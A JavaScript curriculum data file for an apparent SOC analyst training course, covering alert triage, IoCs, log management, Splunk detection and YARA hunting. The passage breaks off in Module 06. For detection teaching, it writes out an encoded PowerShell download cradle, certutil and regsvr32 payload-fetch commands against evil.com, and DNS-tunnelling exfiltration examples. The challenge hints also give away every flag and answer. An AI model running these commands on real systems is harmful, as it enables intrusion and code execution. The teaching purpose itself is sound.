// CyberSOC Academy Master Pathway - 8 Enterprise Modules Curriculum Data
// Curriculum aligned with official SOC Analyst certification standards:
// Module 01: Security Operations and Management
// Module 02: Understanding Cyber Threats, IoCs, and Attack Methodology
// Module 03: Log Management
// Module 04: Incident Detection and Triage
// Module 05: Proactive Threat Detection
// Module 06: Incident Response
// Module 07: Forensic Investigation and Malware Analysis
// Module 08: SOC for Cloud Environments
// Author: Mohammed Moshii (CSA, CEH, NASA Hall of Fame)

export const SOC_MODULES = [
  {
    id: "soc-mod-01",
    slug: "security-operations-management",
    moduleNumber: "01",
    title: "Security Operations and Management",
    category: "core",
    categoryLabel: "Core Operations",
    status: "completed",
    progress: 100,
    difficulty: "Beginner",
    duration: "45 Mins",
    slideCount: 21,
    labCount: "3 Labs Completed (3/3)",
    tags: ["SOC Models", "Cyber Defence Frameworks", "MITRE ATT&CK"],
    skills: ["SOC Architecture", "Pyramid of Pain", "Cyber Kill Chain", "Diamond Model", "MITRE ATT&CK"],
    summary: "Establish defense operations foundation: SOC models, metrics, tools, and Cyber Defence Frameworks (Pyramid of Pain, Cyber Kill Chain, Diamond Model, MITRE ATT&CK).",

    slideSections: [
      {
        id: "soc-operations",
        title: "SOC Operations",
        slides: [
          { id: 1, title: "SOC Analyst 2026", image: "/soc-slides/module-01/1.png" },
          { id: 2, title: "SOC Models", image: "/soc-slides/module-01/2.png" },
          { id: 3, title: "People, Processes, Technology", image: "/soc-slides/module-01/3.png" },
          { id: 4, title: "SOC Team Structure", image: "/soc-slides/module-01/4.png" },
          { id: 5, title: "Analyst Career Path", image: "/soc-slides/module-01/5.png" },
          { id: 6, title: "Event Management", image: "/soc-slides/module-01/6.png" },
          { id: 7, title: "Incident Management", image: "/soc-slides/module-01/7.png" },
          { id: 8, title: "Detection Outcomes", image: "/soc-slides/module-01/8.png" },
          { id: 9, title: "SOC Metrics", image: "/soc-slides/module-01/9.png" },
          { id: 10, title: "SOC Tools", image: "/soc-slides/module-01/10.png" },
          { id: 11, title: "Common Threat Types", image: "/soc-slides/module-01/11.png" }
        ]
      },
      {
        id: "cyber-defence-frameworks",
        title: "Cyber Defence Frameworks",
        slides: [
          { id: 11, title: "Cyber Defence Frameworks", image: "/soc-slides/module-01/cyber-defence-frameworks/11.png" },
          { id: 12, title: "Pyramid of Pain — Hashing & IP (Fast Flux)", image: "/soc-slides/module-01/cyber-defence-frameworks/12.png" },
          { id: 13, title: "Pyramid of Pain — DNS (Punycode)", image: "/soc-slides/module-01/cyber-defence-frameworks/13.png" },
          { id: 14, title: "Pyramid of Pain — DNS (URL Shorteners)", image: "/soc-slides/module-01/cyber-defence-frameworks/14.png" },
          { id: 15, title: "Pyramid of Pain — Host Artifacts", image: "/soc-slides/module-01/cyber-defence-frameworks/15.png" },
          { id: 16, title: "Pyramid of Pain — Network Artifacts", image: "/soc-slides/module-01/cyber-defence-frameworks/16.png" },
          { id: 17, title: "Cyber Kill Chain", image: "/soc-slides/module-01/cyber-defence-frameworks/17.png" },
          { id: 18, title: "Diamond Model Overview", image: "/soc-slides/module-01/cyber-defence-frameworks/18.png" },
          { id: 19, title: "Diamond Model — Event Meta-features", image: "/soc-slides/module-01/cyber-defence-frameworks/19.png" },
          { id: 20, title: "MITRE ATT&CK — Real Scenario (T1555)", image: "/soc-slides/module-01/cyber-defence-frameworks/20.png" }
        ]
      }
    ],

    slides: [],

    theory: {
      overview: "Security Operations Centers operate on strict analytical workflows. In this module, we examine how enterprise telemetry converges into the SIEM and how a Tier 1 SOC analyst approaches incoming alerts methodically.",
      sections: [
        {
          heading: "1. The 5-Step Alert Verification Framework",
          content: "When an alert pops in the SIEM dashboard, never jump to conclusions. Follow the 5-step investigative framework:",
          steps: [
            "1. Source & Destination Analysis: What IP or process initiated the connection? Is it internal, external, RFC1918 private, or known CDN?",
            "2. User & Host Context: Is the user a standard finance employee or a Domain Admin? Why is a marketing workstation running PowerShell encoded commands at 3:00 AM?",
            "3. Reputation & Threat Intel Lookup: Check file hashes (SHA256) on VirusTotal, AlienVault OTX, and IP reputation on AbuseIPDB.",
            "4. Temporal Proximity (Log Pivoting): What happened 5 minutes BEFORE the alert and 5 minutes AFTER? Look for follow-up network sockets or file writes.",
            "5. Disposition & Action: Mark as Confirmed True Positive (Escalate to Tier 2) or False Positive (Document for detection engineering tuning)."
          ]
        },
        {
          heading: "2. Alert Prioritization & Severity Scoring",
          content: "SOC triage queues prioritize alerts using Criticality and Impact matrices:",
          table: {
            headers: ["Severity", "Expected SLA", "Examples", "Initial Action"],
            rows: [
              ["Critical (P1)", "< 15 Mins", "Active Ransomware, Domain Controller DCSync, EDR Tampering", "Immediate host isolation, sever network socket, notify CISO"],
              ["High (P2)", "< 30 Mins", "Mimikatz memory dump, C2 beaconing, Multiple failed logins followed by success", "Verify process tree, freeze account credentials, isolate host"],
              ["Medium (P3)", "< 2 Hours", "Port scan against DMZ, Unsigned executable in Temp dir, Policy violation", "Query host logs, analyze hash, check if authorized admin tool"],
              ["Low / Info (P4)", "< 24 Hours", "New USB device plugged in, Single failed login attempt", "Log for audit trail, close after contextual review"]
            ]
          }
        }
      ]
    },

    lab: {
      title: "Interactive Alert Triage Simulator",
      scenario: "Your SIEM queue has just flagged three concurrent security events on workstation 'WS-FINANCE-04'. Investigate the alerts, decode payloads, prioritize the incident, and determine if an active attacker has compromised the host.",
      type: "alert-triage-sim",
      alerts: [
        {
          id: "ALT-9021",
          severity: "HIGH",
          timestamp: "2026-11-26 02:14:19 UTC",
          rule: "Suspicious PowerShell EncodedCommand Execution",
          host: "WS-FINANCE-04 (192.168.10.45)",
          user: "corp\\sarah.connor",
          details: "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADkANQAuADIAMAAxAC4AMQAwAC4AMQA0ADoAOAAwADgAMAAvAG0AYQB0AHIAaQB4AC4AcABzADEAIgApAA==",
          status: "Pending Investigation"
        },
        {
          id: "ALT-9022",
          severity: "CRITICAL",
          timestamp: "2026-11-26 02:15:02 UTC",
          rule: "Outbound Network Socket to Known Cobalt Strike C2",
          host: "WS-FINANCE-04 (192.168.10.45)",
          user: "corp\\sarah.connor",
          details: "Established TCP connection to 195.201.10.14:8080 (Threat Feed Tag: CobaltStrike_MalleableC2)",
          status: "Pending Investigation"
        },
        {
          id: "ALT-9023",
          severity: "LOW",
          timestamp: "2026-11-26 02:16:30 UTC",
          rule: "Antivirus Definition Update Successful",
          host: "WS-FINANCE-04 (192.168.10.45)",
          user: "SYSTEM",
          details: "Windows Defender Engine updated signatures to version 1.401.882.0",
          status: "Pending Investigation"
        }
      ],
      taskInstructions: "1. Decode the Base64 command from ALT-9021.\n2. Correlate with ALT-9022 to identify the C2 IP.\n3. Decide whether this is a True Positive and extract the malicious downloaded script filename."
    },

    challenge: {
      question: "Base64 decode the PowerShell command in ALT-9021. What is the full URL or script name downloaded by the attacker?",
      targetKey: "matrix.ps1",
      flag: "flag{s0c_t1er1_tr1age_mast3red}",
      hint: "Look at the decoded payload: IEX (New-Object Net.WebClient).DownloadString('http://195.201.10.14:8080/matrix.ps1'). The flag is flag{s0c_t1er1_tr1age_mast3red}",
      points: 150
    }
  },

  {
    id: "soc-mod-02",
    slug: "understanding-cyber-threats-iocs",
    moduleNumber: "02",
    title: "Understanding Cyber Threats, IoCs, and Attack Methodology",
    category: "core",
    categoryLabel: "Core Operations",
    status: "completed",
    progress: 100,
    difficulty: "Intermediate",
    duration: "60 Mins",
    slideCount: 18,
    labCount: "5 Labs Completed (5/5)",
    tags: ["Cyber Kill Chain", "MITRE ATT&CK", "Pyramid of Pain"],
    skills: ["Cyber Kill Chain", "MITRE ATT&CK Matrix", "Pyramid of Pain", "IoC Identification", "Threat Intelligence"],
    summary: "Analyze adversary tradecraft, Indicators of Compromise (IoCs), the Cyber Kill Chain, MITRE ATT&CK mapping, and dissect covert network exfiltration.",

    slides: [
      {
        id: 1,
        title: "The Cyber Kill Chain & Attack Lifecycle",
        subtitle: "From Reconnaissance to Actions on Objectives",
        bullets: [
          "Lockheed Martin Cyber Kill Chain: Recon ➔ Weaponization ➔ Delivery ➔ Exploitation ➔ Installation ➔ C2 ➔ Actions on Objectives.",
          "Disrupting an adversary at ANY stage prior to Actions on Objectives neutralizes the intrusion.",
          "Attacker network lifecycle: Discovery ➔ Command & Control (C2) ➔ Data Staging ➔ Exfiltration."
        ],
        diagram: `
 [ Recon ] ──> [ Weaponize ] ──> [ Deliver ] ──> [ Exploit ] ──> [ Install ] ──> [ C2 ] ──> [ Impact ]
                                                       │
 [ DEFENDER BREAKS CHAIN HERE ] <──────────────────────┘`,
        takeaway: "The earlier in the kill chain an attack is detected, the less damage and lower the containment costs."
      },
      {
        id: 2,
        title: "The Pyramid of Pain",
        subtitle: "How Much Pain Do You Cause the Adversary?",
        bullets: [
          "Hash Values (Trivial): MD5/SHA256 — Changing one byte changes the hash instantly.",
          "IP Addresses (Easy): Attackers easily rotate cloud VPS or Tor exit nodes.",
          "Domain Names (Simple): Fast-flux DNS and DGA rotate domains hourly.",
          "TTPs - Tactics, Techniques & Procedures (Tough!): Forcing an adversary to change how they operate wastes months of R&D."
        ],
        diagram: `
                   ▲  [ TTPs ]  ── Tough! (Behavioral Changes)
                  / \\
                 /   \\  [ Tools ]  ── Challenging (Rewrite payloads)
                /     \\
               /       \\  [ Network/Host Artifacts ] ── Annoying
              /         \\
             /           \\  [ Domain Names ] ── Simple
            /             \\
           /               \\  [ IP Addresses ] ── Easy
          /─────────────────\\
         /    HASH VALUES    \\ ── Trivial (One byte change)`
      },
      {
        id: 3,
        title: "Anatomy of a C2 Beacon",
        subtitle: "Heartbeats, Jitter, and Malleable Profiles",
        bullets: [
          "C2 Beaconing: Periodic outbound HTTP/HTTPS/DNS requests sent from compromised host to attacker listener requesting commands.",
          "Sleep Time: Interval between callbacks (e.g., 60 seconds).",
          "Jitter: Random variance percentage added to sleep time (e.g., 20%) to evade automated statistical detection.",
          "How to spot: Search for regular periodic spikes in NetFlow histograms or repetitive URI patterns."
        ],
        diagram: `
 TIME ➔   [00:00]          [01:03]          [02:08]          [03:02]
 REQUEST:  POST /sync ────> POST /sync ────> POST /sync ────> POST /sync
 INTERVAL: ~60 sec + 5% jitter (Cobalt Strike / Sliver characteristic)`
      },
      {
        id: 4,
        title: "DNS Tunneling & Covert Exfiltration",
        subtitle: "Abusing the Internet's Phonebook to Steal Secrets",
        bullets: [
          "Organizations frequently permit outbound DNS (UDP 53) unrestricted through enterprise firewalls.",
          "Adversary registers `attacker-c2.com` and runs an authoritative name server.",
          "Infected host queries: `bXlwYXNzd29yZDEyMw==.attacker-c2.com`. The encoded data is logged directly by the attacker's DNS server!",
          "Detection: High volume of Subdomain queries, unusually high entropy in domain labels, and high ratio of TXT/NULL record queries."
        ]
      }
    ],

    theory: {
      overview: "Understanding adversary attack methodology and Indicators of Compromise enables defenders to anticipate threat actor movements before sensitive assets are breached.",
      sections: [
        {
          heading: "1. Core Protocol Indicators & Threat Signals",
          content: "Attackers blend in with legitimate network noise. Below are the key protocol features every SOC analyst checks:",
          table: {
            headers: ["Protocol", "Normal Behavior", "Malicious Anomaly Indicator"],
            rows: [
              ["DNS (Port 53)", "Short queries (<25 chars), mostly A/AAAA, low frequency", "Length > 50 chars, high entropy, repeated TXT queries, high failure rate"],
              ["HTTP (Port 80)", "Standard browser User-Agents, GET requests dominant", "Weird User-Agent ('curl/7.68', 'Go-http-client'), repetitive POST requests with small payloads"],
              ["HTTPS / TLS (Port 443)", "Valid CA certs, known SNIs, standard JA3 signatures", "Self-signed certificates, missing SNI, mismatched domain names, untrusted root CAs"],
              ["SMB (Port 445)", "Internal file shares, printer traffic, domain auth", "PsExec lateral movement (`IPC$`, `ADMIN$`), `svcctl` named pipe calls"]
            ]
          }
        }
      ]
    },

    lab: {
      title: "Interactive Wireshark Stream Inspector",
      scenario: "A sensor flagged high DNS request volume from host '10.0.5.22'. Inspect the captured network packet log below to determine the exfiltrated sensitive string.",
      type: "network-packet-sim",
      packets: [
        { no: 101, time: "14:22:01.102", src: "10.0.5.22", dst: "8.8.8.8", proto: "DNS", info: "Standard query 0x01a2 A google.com" },
        { no: 102, time: "14:22:01.144", src: "8.8.8.8", dst: "10.0.5.22", proto: "DNS", info: "Standard query response 0x01a2 A 142.250.180.206" },
        { no: 103, time: "14:22:15.301", src: "10.0.5.22", dst: "1.1.1.1", proto: "DNS", info: "Standard query 0x4b90 TXT c2VjcmV0X3Byb2plY3RfeF8yMDI2.tunnel.apt-phantom.org" },
        { no: 104, time: "14:22:16.890", src: "10.0.5.22", dst: "1.1.1.1", proto: "DNS", info: "Standard query 0x4b91 TXT ZGF0YV9leGZpbHRyYXRlZF9jb21wbGV0ZQ==.tunnel.apt-phantom.org" },
        { no: 105, time: "14:22:30.012", src: "10.0.5.22", dst: "192.168.1.1", proto: "ARP", info: "Who has 10.0.5.1? Tell 10.0.5.22" }
      ],
      taskInstructions: "1. Notice Packet 103 and 104 querying 'tunnel.apt-phantom.org'.\n2. Base64 decode the subdomain string in Packet 103: 'c2VjcmV0X3Byb2plY3RfeF8yMDI2'.\n3. Uncover the secret keyword being exfiltrated."
    },

    challenge: {
      question: "What is the decoded plaintext message hidden inside the DNS TXT query in Packet 103?",
      targetKey: "secret_project_x_2026",
      flag: "flag{dns_tunn3l_3xf1ltrat10n_d3t3ct3d}",
      hint: "Base64 decode 'c2VjcmV0X3Byb2plY3RfeF8yMDI2' to get 'secret_project_x_2026'. The flag is flag{dns_tunn3l_3xf1ltrat10n_d3t3ct3d}",
      points: 150
    }
  },

  {
    id: "soc-mod-03",
    slug: "log-management",
    moduleNumber: "03",
    title: "Log Management",
    category: "siem",
    categoryLabel: "SIEM & Telemetry",
    status: "completed",
    progress: 100,
    difficulty: "Intermediate",
    duration: "55 Mins",
    slideCount: 32,
    labCount: "2 TryHackMe Rooms",
    tags: ["Log Pipeline", "System Auditing", "Elasticsearch"],
    skills: ["Windows Event Logs", "System Auditing", "Elasticsearch & Fleet", "Elastic Agent", "KQL Log Filtering"],
    summary: "Master centralized log collection, Windows file system auditing, Event ID 4663 verification, and setting up Elastic Cloud, Fleet, and Elastic Agent telemetry pipelines.",

    slideSections: [
      {
        id: "system-auditing",
        title: "System Auditing",
        slides: [
          { id: 11, title: "Enable File System Auditing (secpol.msc)", image: "/soc-slides/module-03/system-auditing/11.png" },
          { id: 12, title: "Advanced Audit Policy Configuration", image: "/soc-slides/module-03/system-auditing/12.png" },
          { id: 13, title: "Object Access — Audit File System", image: "/soc-slides/module-03/system-auditing/13.png" },
          { id: 14, title: "Enable Success & Failure Auditing (auditpol)", image: "/soc-slides/module-03/system-auditing/14.png" },
          { id: 15, title: "Create File & Rule Target (cysa.conf)", image: "/soc-slides/module-03/system-auditing/15.png" },
          { id: 16, title: "Security Properties → Advanced Auditing", image: "/soc-slides/module-03/system-auditing/16.png" },
          { id: 17, title: "Select Auditing Principal", image: "/soc-slides/module-03/system-auditing/17.png" },
          { id: 18, title: "Configure Basic Auditing Permissions", image: "/soc-slides/module-03/system-auditing/18.png" },
          { id: 19, title: "Configure Advanced Auditing Permissions", image: "/soc-slides/module-03/system-auditing/19.png" },
          { id: 20, title: "Edit the Monitored File (cysa.conf)", image: "/soc-slides/module-03/system-auditing/20.png" },
          { id: 21, title: "Event Viewer Security Log (Event ID 4663)", image: "/soc-slides/module-03/system-auditing/21.png" }
        ]
      },
      {
        id: "setup-elasticsearch",
        title: "Setup Elastic Search",
        slides: [
          { id: 28, title: "Log in to Elastic Cloud", image: "/soc-slides/module-03/setup-elasticsearch/28.png" },
          { id: 29, title: "Create Hosted Deployment", image: "/soc-slides/module-03/setup-elasticsearch/29.png" },
          { id: 30, title: "Select Elasticsearch Solution View", image: "/soc-slides/module-03/setup-elasticsearch/30.png" },
          { id: 31, title: "Configure Deployment Name & Cloud Region", image: "/soc-slides/module-03/setup-elasticsearch/31.png" },
          { id: 32, title: "Save Deployment Credentials", image: "/soc-slides/module-03/setup-elasticsearch/32.png" },
          { id: 33, title: "Get Started & Open Deployment Management", image: "/soc-slides/module-03/setup-elasticsearch/33.png" },
          { id: 34, title: "Open Integrations Server", image: "/soc-slides/module-03/setup-elasticsearch/34.png" },
          { id: 35, title: "Launch Fleet Management", image: "/soc-slides/module-03/setup-elasticsearch/35.png" },
          { id: 36, title: "Fleet Dashboard — Add New Agent", image: "/soc-slides/module-03/setup-elasticsearch/36.png" },
          { id: 37, title: "Create Agent Policy (win7)", image: "/soc-slides/module-03/setup-elasticsearch/37.png" },
          { id: 38, title: "Windows PowerShell Agent Install Command", image: "/soc-slides/module-03/setup-elasticsearch/38.png" },
          { id: 39, title: "Run Elastic Agent Installer & Accept License", image: "/soc-slides/module-03/setup-elasticsearch/39.png" },
          { id: 40, title: "Agent Enrollment Confirmed", image: "/soc-slides/module-03/setup-elasticsearch/40.png" },
          { id: 41, title: "Verify Healthy Enrolled Host (MOSHII)", image: "/soc-slides/module-03/setup-elasticsearch/41.png" },
          { id: 42, title: "Metrics System Overview Dashboard", image: "/soc-slides/module-03/setup-elasticsearch/42.png" },
          { id: 43, title: "Windows Overview Security Events Dashboard", image: "/soc-slides/module-03/setup-elasticsearch/43.png" },
          { id: 44, title: "Open Deployment from Elastic Cloud Home", image: "/soc-slides/module-03/setup-elasticsearch/44.png" },
          { id: 45, title: "Open Discover in Elasticsearch", image: "/soc-slides/module-03/setup-elasticsearch/45.png" },
          { id: 46, title: "Select logs-* Data View", image: "/soc-slides/module-03/setup-elasticsearch/46.png" },
          { id: 47, title: "View Ingested Agent Logs", image: "/soc-slides/module-03/setup-elasticsearch/47.png" },
          { id: 48, title: "Filter Logs with KQL (host.hostname : \"MOSHII\")", image: "/soc-slides/module-03/setup-elasticsearch/48.png" }
        ]
      }
    ],

    slides: [],

    theory: {
      overview: "Effective log management transforms massive streams of disparate system events into structured, searchable intelligence.",
      sections: [
        {
          heading: "1. LOLBAS Cheat Sheet for SOC Log Review",
          content: "Attackers use pre-installed Windows utilities to bypass antivirus. Look for these exact flags in log files:",
          table: {
            headers: ["Binary", "Legitimate Purpose", "Adversary Usage Syntax"],
            rows: [
              ["certutil.exe", "Certificate management", "certutil.exe -urlcache -split -f http://evil.com/m.exe C:\\Temp\\m.exe"],
              ["bitsadmin.exe", "Background intelligent transfer", "bitsadmin /transfer job /download /priority normal http://... C:\\file.exe"],
              ["mshta.exe", "Execute Microsoft HTML apps", "mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:http://...\")\"))"],
              ["regsvr32.exe", "Register DLLs in Registry", "regsvr32 /u /n /s /i:http://evil.com/payload.sct scrobj.dll (Squiblydoo)"],
              ["wmic.exe", "Windows Management Instrumentation", "wmic process call create \"powershell.exe -enc ...\""]
            ]
          }
        }
      ]
    },

    lab: {
      title: "TryHackMe SIEM Labs — Splunk & ELK",
      scenario: "Click either TryHackMe room logo below to launch the Splunk or ELK (Elastic Stack) lab in a new tab.",
      type: "tryhackme-rooms",
      rooms: [
        {
          id: "splunk-siem",
          tool: "Splunk",
          platform: "TryHackMe",
          title: "Log Analysis with SIEM",
          description: "Analyze centralized Windows, Linux, and web event logs using Splunk SIEM queries.",
          url: "https://tryhackme.com/room/loganalysiswithsiem",
          logo: "/soc-labs/module-03/splunk-loganalysiswithsiem.png",
          accent: "#38bdf8"
        },
        {
          id: "elk-servidae",
          tool: "ELK",
          platform: "TryHackMe",
          title: "Servidae",
          description: "Investigate compromised workstation telemetry logs inside Elastic Stack (ELK) and Kibana.",
          url: "https://tryhackme.com/room/servidae",
          logo: "/soc-labs/module-03/elk-servidae.png",
          accent: "#10b981"
        }
      ]
    },

    challenge: null
  },

  {
    id: "soc-mod-04",
    slug: "incident-detection-and-triage",
    moduleNumber: "04",
    title: "Incident Detection and Triage",
    category: "siem",
    categoryLabel: "SIEM & Telemetry",
    status: "active",
    progress: 60,
    difficulty: "Advanced",
    duration: "65 Mins",
    slideCount: 22,
    labCount: "3 / 6 Labs Completed",
    tags: ["Alert Triage", "SIEM Correlation", "Splunk SPL"],
    skills: ["Splunk SPL", "Correlation Rules", "False Positive Triage", "Alert Prioritization", "Rule Tuning"],
    summary: "Detect suspicious activity via SIEM correlation rules, perform rapid alert triage, eliminate false positives, and validate true positive intrusions.",

    slides: [
      {
        id: 1,
        title: "The SIEM: Aggregation to Intelligence",
        subtitle: "Search, Correlate, Alert, and Automate",
        bullets: [
          "Security Information and Event Management (SIEM) aggregates logs from thousands of endpoints, servers, firewalls, and cloud assets.",
          "Leading platforms: Splunk Enterprise Security, Elastic Security, Microsoft Sentinel, IBM QRadar.",
          "Core mechanism: Indexing raw logs ➔ Normalizing with Common Information Model (CIM) ➔ Running Scheduled Correlation Searches ➔ Firing Notable Events."
        ],
        diagram: `
 [ Endpoints ]  [ Firewalls ]  [ Active Directory ]  [ AWS/Azure ]
       │              │                 │                  │
       └──────────────┴────────┬────────┴──────────────────┘
                               ▼
                 [ Universal Forwarders ]
                               ▼
               [ Splunk Indexers / Data Pipeline ]
                               ▼
          [ Splunk Search Head + Correlation Searches ]
                               ▼
               [ SOC Alert Queue / Notable Events ]`
      },
      {
        id: 2,
        title: "Splunk SPL Syntax Essentials",
        subtitle: "The Pipe Pipeline: index, stats, eval, and where",
        bullets: [
          "`index=winsec EventCode=4625`: Search Windows security logs for failed logons.",
          "`| stats count by user, src_ip`: Aggregate results into a table counting attempts per user and IP.",
          "`| where count > 10`: Filter for high-frequency failures indicating brute-force.",
          "`| lookup threat_intel_feed ip AS src_ip OUTPUT is_malicious`: Enrich data in real time against threat lists."
        ],
        diagram: `
 index=winsec EventCode=4625
       │
       ▼ | stats count by user, src_ip
       │
       ▼ | where count > 10
       │
       ▼ [ ALERT FIRED: Password Spraying Detected! ]`
      },
      {
        id: 3,
        title: "Detecting Password Spraying vs Brute Force",
        subtitle: "Understanding Adversary Authentication Tactic Differences",
        bullets: [
          "Brute Force: 1 User Account attacked with 10,000 different passwords (causes rapid account lockout).",
          "Password Spraying: 10,000 User Accounts attacked with 1 or 2 common passwords (e.g. `Winter2026!`) over hours to avoid lockouts.",
          "Detection Logic for Spraying: Count distinct users failing authentication from a single source IP within a rolling time window (`dc(user) > 20`)."
        ]
      },
      {
        id: 4,
        title: "Statistical Anomaly Triage in SIEM",
        subtitle: "Outlier Detection for Beaconing & Lateral Movements",
        bullets: [
          "Adversaries customize beacon jitter to evade static timer alerts.",
          "Use statistical commands `eventstats avg(count) as avg_c, stdev(count) as std_c by src_ip, dest_ip`.",
          "Filter for low standard deviation indicating tight automated loops.",
          "Cross-reference destination IPs against VirusTotal and AbuseIPDB feeds."
        ]
      }
    ],

    theory: {
      overview: "Detection engineers construct the rules that power modern SOC defense. Here is the operational blueprint for Splunk SPL and Sigma rule deployment.",
      sections: [
        {
          heading: "1. Production Splunk Detection Queries",
          content: "Use these vetted detection queries in your security environment:",
          codeBlock: `# 1. Detect Suspicious Account Created Outside Business Hours
index=winsec EventCode=4720 
| eval Hour=strftime(_time, "%H") 
| where Hour < 6 OR Hour > 20 
| stats count by TargetUserName, SubjectUserName, ComputerName

# 2. Detect Password Spraying Attempt
index=winsec EventCode=4625 
| stats count dc(user) as UniqueUsers by src_ip 
| where UniqueUsers > 15 AND count > 25

# 3. Detect Clearing of Security Event Logs (Anti-Forensics)
index=winsec EventCode=1102 OR EventCode=104
| table _time, ComputerName, user, Message`
        }
      ]
    },

    lab: {
      title: "Interactive Splunk Terminal Query Lab",
      scenario: "Run live Splunk SPL queries against an indexed corporate dataset to identify a compromised account being used for data staging and unmask password sprayers.",
      type: "splunk-query-sim",
      dataset: [
        { _time: "2026-11-26 03:01", index: "winsec", eventCode: 4625, user: "j.doe", src_ip: "185.220.101.4", action: "Failed Login" },
        { _time: "2026-11-26 03:02", index: "winsec", eventCode: 4625, user: "m.smith", src_ip: "185.220.101.4", action: "Failed Login" },
        { _time: "2026-11-26 03:03", index: "winsec", eventCode: 4625, user: "b.wayne", src_ip: "185.220.101.4", action: "Failed Login" },
        { _time: "2026-11-26 03:04", index: "winsec", eventCode: 4624, user: "b.wayne", src_ip: "185.220.101.4", action: "Successful Login!" }
      ],
      taskInstructions: "1. Identify the external IP spraying passwords.\n2. Note which account was successfully compromised after 3 failed attempts.\n3. The compromised username is the key to solving the challenge."
    },

    challenge: {
      question: "Which username was successfully breached by IP 185.220.101.4 after the password spray in the lab?",
      targetKey: "b.wayne",
      flag: "flag{spl_qu3ry_brut3f0rc3_unmask3d}",
      hint: "Look at the successful EventCode 4624 from 185.220.101.4. The username is b.wayne. The flag is flag{spl_qu3ry_brut3f0rc3_unmask3d}",
      points: 150
    }
  },

  {
    id: "soc-mod-05",
    slug: "proactive-threat-detection",
    moduleNumber: "05",
    title: "Proactive Threat Detection",
    category: "core",
    categoryLabel: "Threat Hunting",
    status: "locked",
    progress: 0,
    difficulty: "Advanced",
    duration: "50 Mins",
    slideCount: 16,
    labCount: "4 Cyber Labs",
    tags: ["Threat Hunting", "Sigma Rules", "YARA Signatures"],
    skills: ["Threat Hunting", "Sigma Rules", "YARA Signatures", "Beaconing Detection", "Living off the Land"],
    summary: "Execute hypothesis-driven threat hunting, create custom Sigma and YARA detection rules, and identify stealthy LOLBAS persistence.",

    slides: [
      {
        id: 1,
        title: "Proactive Threat Hunting Philosophy",
        subtitle: "Assume Breach: Finding What Alerts Missed",
        bullets: [
          "Reactive Detection: Waiting for an alert rule to trigger on known signatures.",
          "Proactive Threat Hunting: Hypothesis-driven searching through historical telemetry assuming an adversary is already inside.",
          "Hunting Loop: Hypothesis Formulation ➔ Telemetry Collection & Tool Execution ➔ Pattern Identification ➔ New Automated Detection."
        ],
        diagram: `
 ┌────────────────────────────────────────────────────────┐
 │            THE PROACTIVE HUNTING CYCLE                 │
 ├────────────────────────────────────────────────────────┤
 │ 1. Formulate Hypothesis (e.g. "Adversary uses LOLBAS") │
 │ 2. Query SIEM Telemetry & Endpoint Artifacts           │
 │ 3. Uncover Anomalies & Unknown Unknowns               │
 │ 4. Author Permanent Sigma / YARA Rule                  │
 └────────────────────────────────────────────────────────┘`
      },
      {
        id: 2,
        title: "Sigma Rule Architecture",
        subtitle: "The Vendor-Agnostic Detection Standard",
        bullets: [
          "Sigma allows detection engineers to write detection signatures once in clean YAML and compile to Splunk SPL, Elastic KQL, or Sentinel.",
          "Structure: title, status, description, logsource (category, product), detection (selection, condition), falsepositives.",
          "Enables rapid sharing of newly discovered APT detection logic across the global blue team community."
        ]
      },
      {
        id: 3,
        title: "YARA Rule Engineering for Memory Hunting",
        subtitle: "Pattern Matching for Malware Analysts & SOC Hunters",
        bullets: [
          "YARA is the Swiss Army knife for pattern matching in binaries, files, and memory dumps.",
          "Structure: `rule RuleName { meta: ... strings: ... condition: ... }`.",
          "Strings support ASCII, wide (UTF-16), hexadecimal byte patterns, and regex.",
          "Example condition: `uint16(0) == 0x5A4D and any of ($str*)` (Verifies Windows PE header `MZ` before matching strings)."
        ],
        diagram: `
 rule Detect_CobaltStrike_Beacon {
     meta:
         author = "Mohammed Moshii"
     strings:
         $mz = { 4D 5A }
         $c2_pipe = "\\\\.\\pipe\\msagent_" ascii
     condition:
         $mz at 0 and $c2_pipe
 }`
      }
    ],

    theory: {
      overview: "Proactive threat detection transforms defensive operations from reactive firefighting into systematic adversary hunting.",
      sections: [
        {
          heading: "1. MITRE ATT&CK Core Tactic Summary for Hunters",
          content: "Enterprise hunters prioritize hypothesis development along these technique categories:",
          table: {
            headers: ["Tactic ID", "Name", "Key Techniques to Hunt"],
            rows: [
              ["TA0001", "Initial Access", "T1566 Phishing, T1190 Exploit Public-Facing App"],
              ["TA0002", "Execution", "T1059.001 PowerShell, T1059.003 Windows Command Shell"],
              ["TA0003", "Persistence", "T1547 Boot or Logon Autostart, T1053 Scheduled Task/Job"],
              ["TA0006", "Credential Access", "T1003 OS Credential Dumping (LSASS, SAM, NTDS.dit)"],
              ["TA0008", "Lateral Movement", "T1021.002 SMB/Windows Admin Shares (PsExec), T1021.006 WMI"]
            ]
          }
        }
      ]
    },

    lab: {
      title: "Interactive YARA Rule Matcher",
      scenario: "Review the simulated memory string dump of a suspected Trojan. Identify the malicious named pipe string to complete the YARA detection rule.",
      type: "yara-validator-sim",
      memoryDumpStrings: [
        "KERNEL32.DLL",
        "VirtualAlloc",
        "WriteProcessMemory",
        "\\\\.\\pipe\\msagent_55a9b",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      ],
      taskInstructions: "1. Inspect the memory dump.\n2. Spot the telltale Cobalt Strike default named pipe: '\\\\.\\pipe\\msagent_55a9b'.\n3. This pipe name validates the signature."
    },

    challenge: {
      question: "What is the exact named pipe string identified in the malware memory dump?",
      targetKey: "\\\\.\\pipe\\msagent_55a9b",
      flag: "flag{yara_m1tr3_att4ck_hunt3r}",
      hint: "The named pipe is '\\\\.\\pipe\\msagent_55a9b'. The flag is flag{yara_m1tr3_att4ck_hunt3r}",
      points: 150
    }
  },

  {
    id: "soc-mod-06",
    slug: "incident-response",
    moduleNumber: "06",
    title: "Incident Response",
    category: "ir",
    categoryLabel: "Incident Response",
    status: "locked",
    progress: 0,
    difficulty: "Advanced",
    duration: "65 Mins",
    slideCount: 16,
    labCount: "4 Simulation Labs",
    tags: ["NIST SP 800-61", "Host Containment", "Playbooks"],
    skills: ["Incident Lifecycle", "Host Containment", "Network Isolation", "Remediation Playbooks", "Evidence Preservation"],
